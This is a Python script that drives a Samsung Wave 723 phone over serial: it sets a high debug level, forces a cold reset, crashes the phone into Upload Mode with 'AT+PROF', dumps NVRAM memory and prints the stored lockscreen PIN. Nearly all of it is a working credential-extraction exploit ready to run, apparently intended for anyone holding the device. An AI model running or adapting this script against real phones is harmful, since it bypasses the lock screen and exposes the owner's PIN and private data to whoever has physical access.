import serial
import time
import getpass
import serial.tools.list_ports

comport = serial.Serial()

RB_MISC = 0x05

logs = False

def lprint(txt):
    if logs:
        print(txt)

def crc16_cms(data):
    crc = 0xFFFF
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            crc = (crc << 1) ^ 0x8005 if crc & 0x8000 else crc << 1
            crc &= 0xFFFF
    return crc

def buildcmd(data, subcommand, command):
    cmd = data.encode() + b"\0"
    crc = crc16_cms(bytes([subcommand]) + bytes([command]) + len(cmd).to_bytes(2, 'little') + cmd)
    packet = bytearray()
    packet.append(0x7F)
    packet.extend((len(cmd)+6).to_bytes(2, 'little'))
    packet.append(0x42)
    packet.append(subcommand)
    packet.append(command)
    packet.extend(len(cmd).to_bytes(2, 'little'))
    packet.extend(cmd)
    packet.extend(crc.to_bytes(2, 'big'))
    packet.append(0x7E)
    return packet

def sendUpload(command, sp=comport):
    lprint(f"send UM: {command}")
    sp.reset_input_buffer() # rename to magic_ttyACM_fixer_9000(), fixes like 90% of problems, i don't know why, and neither god knows
    sp.write(command.encode().ljust(12, b'\x00'))
    b = sp.read_until(b'\0')
    if b"AcKnOwLeDgMeNt" in b:
        #print("recv AcKnOwLeDgMeNt")
        return True
    else:
        print("not ACK")
        #print(b)
        return False

def sendAT(command, sp=comport):
    lprint(f"send AT: {command}")
    sp.write(command.encode('utf-8') + b"\r\n")
    time.sleep(50 / 1000)
    b = bytearray()
    while sp.in_waiting > 0:
        b.extend(sp.read_all())
        time.sleep(20 / 1000)
    rawresponse = b.decode('utf-8', errors='replace').strip()
    lines = rawresponse.splitlines()
    lastline = len(lines)-1
    if len(lines) == 0 or not lines[lastline].startswith("OK"):
        return None
    else:
        if command in lines[0]:
            return "\n".join(lines[1:lastline]).strip()
        else:
            return "\n".join(lines[0:lastline]).strip()

def sendTkShell(command, sp=comport):
    lprint(f"send TkShell: {command}")
    sp.write(buildcmd(command, 0, RB_MISC))

def dumpmem(start, end, sp=comport):
    if sendUpload("PrEaMbLe") == False:
        print("FAIL AT: preamble")
        return None
    if sendUpload(f"{start:08X}") == False:
        print("FAIL AT: start addr")
        return None
    if sendUpload(f"{end:08X}") == False:
        print("FAIL AT: end addr")
        return None
    sp.write("DaTaXfEr".encode().ljust(12, b'\x00'))
    if end - start == 3 and (start == 0x01FFFFFC or start == 0x03FFFFFC or start == 0x01EEEFFC):
        time.sleep(0.1)
        return sp.read_all()
    else:
        data = sp.read(end - start)
        if len(data) < end - start:
            data += b"\x00"*((end - start) - len(data))
        return data

def rebootUpload(sp=comport):
    if sendUpload("PrEaMbLe") == False:
        print("FAIL AT: preamble")
        exit()
    if sendUpload("03FFFFFC") == False:
        print("FAIL AT: start addr")
        exit()
    if sendUpload("03FFFFFF") == False:
        print("FAIL AT: end addr")
        exit()
    print(f"rebooting device!")
    sp.write("DaTaXfEr".encode().ljust(12, b'\x00'))
    sp.close()

def getNVRamString(nvIndex, sp=comport):
    memaddr = nvIndex * 0x200 + 0x822798E8
    print(f"getting 0x{nvIndex:02x} from NVRAM...")
    block: bytes = dumpmem(memaddr, memaddr + 0x200, sp)
    if block == None:
        print(f"FAIL AT: dumpmem({memaddr:04X}, {(memaddr + 0x200):04X}, sp)")
        return None
    return block[0:block.index(0)].decode(errors="ignore")

def waitForEnter(message):
    getpass.getpass(message)

def getWaveDevice():
    x = serial.Serial()
    for port in serial.tools.list_ports.comports():
        if port.product == "Wave723":
            x.port = port.device
            x.open()
            if sendAT("AT", x) == "":
                x.close()
                print(f"found Wave723 on {port.device}")
                return port.device
            else:
                x.close()
    return None

def getWaveDeviceUpload():
    x = serial.Serial()
    for port in serial.tools.list_ports.comports():
        if port.vid == 0x04e8 and port.pid == 0x6795:
            x.port = port.device
            x.open()
            if sendUpload("PrEaMbLe", x) == True:
                x.close()
                print(f"found Wave723 in Upload Mode on {port.device}")
                return port.device
            else:
                x.close()
    return None

def waitForWave(upload):
    if upload:
        print("waiting for Wave 723 in Upload Mode...")
    else:
        print("waiting for Wave 723...")
    x = None
    while True:
        if upload:
            x = getWaveDeviceUpload()
        else:
            x = getWaveDevice()
        if x != None:
            return x
        time.sleep(2)


comport.port = waitForWave(False)
comport.open()

if sendAT("AT+CGMM") != "GT-S7230E":
    print("not a Samsung Wave 723!")
    exit()
waitForEnter("ensure your Wave 723 is turned on and at the lock screen\nHOLD DOWN THE HOME BUTTON **NOW!!!**\npress ENTER when ready.")
print("setting Debug Level to high...")
sendTkShell("SetDebugLevel high")
time.sleep(50/1000)
print("restarting device...")
sendAT("AT+COLDRST")
comport.close()
time.sleep(1)
comport.port = waitForWave(False)
comport.open()

print("crashing device\nRELEASE THE HOME BUTTON WHEN THE SCREEN GOES BLACK.")
comport.write("AT+PROF\r".encode())
comport.close()
time.sleep(5)
comport.port = waitForWave(True)
comport.open()

print(f"lockscreen PIN: {getNVRamString(0x17c)}")
rebootUpload()
comport.close()